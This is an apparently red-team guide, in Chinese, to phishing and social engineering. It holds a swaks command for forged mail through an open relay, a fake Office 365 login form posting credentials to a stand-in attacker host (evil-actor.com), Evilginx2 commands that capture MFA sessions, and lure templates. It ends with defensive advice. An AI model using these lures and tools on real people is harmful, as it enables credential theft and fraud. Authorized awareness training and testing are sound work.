# 社工钓鱼技术实战指南

> 社会工程学（Social Engineering）是渗透测试中最"低成本高回报"的环节之一，往往绕过最坚固的技术防御，直接攻击最薄弱的"人"。

## 1. 钓鱼攻击的分类与场景

按攻击目标范围与针对性，常见的钓鱼攻击可分为以下几类：

| 类型 | 说明 | 典型场景 |
|------|------|---------|
| 批量钓鱼（Phishing） | 大规模群发邮件，撒网式 | 伪造银行/快递/税务通知 |
| 鱼叉钓鱼（Spear Phishing） | 针对特定个人/部门，高度定制 | 伪造 CEO 给财务的转账邮件 |
| 鲸钓（Whaling） | 针对高管级别的鱼叉钓鱼 | 伪造董事会邮件 + 仿冒 OA 登录 |
| 水坑攻击（Watering Hole） | 攻陷目标常访问的网站，植入恶意代码 | 攻击行业论坛/常用工具站 |
| 短信钓鱼（Smishing） | 通过短信发送恶意链接 | "您有快递未取，请点击..." |
| 电话钓鱼（Vishing） | 冒充客服/IT/HR 诱导泄露信息 | 冒充 IT 索要 VPN 账号 |
| 域名仿冒（Typosquatting） | 注册相似域名，仿冒真实站点 | `taoboo.com`、`micr0soft.com` |

### 1.1 钓鱼攻击链

一次完整的钓鱼攻击通常遵循以下链路：

```
情报收集 → 伪造内容（邮件/站点） → 发送 → 受害者点击 →
payload 执行 → 主机沦陷 → 凭据窃取 → 横向移动 → 目标达成
```

## 2. 邮件伪造与发送基础设施

邮件钓鱼的核心在于"看起来像真的"。攻击者需要搭建或租用邮件发送基础设施，并绕过 SPF / DKIM / DMARC。

### 2.1 仿冒邮件的关键要素

- **发件人显示名欺骗**：`From: "系统管理员 <admin@target.com>"`，部分邮件客户端优先展示显示名
- **相似域名**：`target-support.com`、`target-corp.com`、`targét.com`（IDN 同形异义字攻击）
- **子域名控制**：控制了 `a.target.com` 后可能可伪造 `@target.com`（取决于 SPF 配置）
- **回复地址**：`Reply-To: hr@evil.com`

### 2.2 绕过 SPF / DKIM / DMARC 的思路

```bash
# 检查目标的邮件安全配置
dig txt target.com          # SPF 记录
dig txt _dmarc.target.com   # DMARC 策略（p=none/quarantine/reject）
dig selector._domainkey.target.com txt  # DKIM 公钥

# 当 SPF 允许宽松配置（如 ~all 或存在失效邮件服务器）时，
# 攻击者可通过第三方中继伪造邮件
swaks --to victim@target.com \
      --from "admin@target.com" \
      --server open_relay_ip:25 \
      --header "Subject: [紧急] 账户密码即将过期" \
      --body "请访问 https://mail.target-verify.com 完成验证"
```

### 2.3 常用钓鱼工具

| 工具 | 用途 |
|------|------|
| `SET（Social-Engineer Toolkit）` | 一体化钓鱼工具包，含邮件、仿冒站点、payload |
| `Gophish` | 开源钓鱼平台，邮件模板 + 仿冒登陆页 + 数据统计 |
| `Evilginx2` | 中间人钓鱼框架，可拦截 MFA 令牌 |
| `King Phisher` | 红队钓鱼演练平台 |
| `swaks` | 命令行 SMTP 测试工具 |
| `spf-check` | SPF/DMARC 检测工具 |

## 3. 仿冒站点与 OAuth 钓鱼

仿冒站点的核心是**视觉欺骗**——让受害者相信自己在访问真实系统。

### 3.1 仿冒登录页的制作

```html
<!-- 仿冒 Office 365 登录表单（关键字段与真实一致） -->
<form action="https://evil-actor.com/steal" method="POST">
  <input type="text" name="login" placeholder="公司邮箱" required>
  <input type="password" name="passwd" placeholder="密码" required>
  <input type="hidden" name="redirect" value="https://outlook.office.com">
  <button type="submit">登 录</button>
</form>
```

提交后，攻击者后台记录凭据，再将受害者 302 跳转到真实登录页，降低被怀疑的概率。

### 3.2 Evilginx2 中间人钓鱼

对于开启了 MFA（多因素认证）的企业，传统凭据钓鱼无法登录。**Evilginx2** 作为中间人代理，可完整转发受害者与真实站点之间的交互，同时抓取有效会话 Cookie / Token：

```bash
# Evilginx2 示例配置
phishlets enable o365
lures create o365
lures edit 0 redirect_url https://outlook.office.com
lures edit 0 phishlet o365
lures get-url 0
# 生成形如 https://login.target-verify.com 的钓鱼链接
```

受害者在钓鱼页输入用户名、密码、MFA 动态码后，攻击者获得完整有效的 Office 365 会话，可直接访问邮箱、Teams、OneDrive。

### 3.3 OAuth 应用授权钓鱼

诱导受害用户"使用 Google / Microsoft 账号登录"第三方应用，授予高权限 Scope（如 `Mail.ReadWrite`、`Files.ReadWrite.All`）。即使受害者修改密码，授权令牌仍有效——这种方式比传统钓鱼更隐蔽，因为不涉及明文密码窃取。

## 4. 社工话术与鱼叉钓鱼情报准备

鱼叉钓鱼的关键在于**情报与语境**。攻击前需要对目标个人进行充分的信息收集：

### 4.1 情报收集点

- **公司组织架构**：LinkedIn / 脉脉 / 官网公开团队页
- **同事姓名 / 职位**：用于伪造内部邮件
- **近期业务事件**：如项目招标、合同签署、人员变动
- **常用工具**：钉钉、飞书、企业微信、Slack、VPN 系统
- **个人兴趣 / 家庭信息**：社交媒体公开内容

### 4.2 常见邮件诱饵模板

| 诱饵主题 | 目标角色 | 话术示例 |
|---------|---------|---------|
| 工资条 / 薪酬调整 | 全公司 | "请查收 9 月份工资明细（含个税调整）" |
| 法务函 / 律师信 | 管理层 / 法务 | "收到关于贵司某合同的律师函，请查收附件" |
| 未读会议邀请 | 各部门 | "【会议提醒】项目评审会议材料请查阅" |
| 快递 / 海关通知 | 个人 | "您有国际包裹待清关，请上传身份证信息" |
| IT 账号密码重置 | 技术人员 | "您的 VPN 密码将于 2 小时后过期，点击重置" |
| 招标 / 供应商报价 | 采购 | "XX 公司报价单（修订版 v3）请确认" |

## 5. 红队演练中的反钓鱼建议

**作为防守方 / 红蓝对抗演练**，企业应做好以下几点：

1. **DMARC p=reject**：严格阻止未认证邮件
2. **邮件安全网关**：扫描附件、链接、沙箱分析
3. **安全意识培训**：定期模拟钓鱼演练，建立点击上报机制
4. **MFA 强制 + 会话保护**：关键系统强制 MFA，并启用条件访问
5. **终端 EDR / 沙箱**：钓鱼附件落地即检测
6. **敏感操作二次确认**：财务转账等操作必须电话 / 当面确认

---

> 社会工程学的本质不是技术，而是对"信任"的利用。攻防双方的博弈，归根结底是对人的判断力的考验。本指南仅用于合法授权的红队演练与企业安全意识培训，严禁用于未授权的攻击活动。
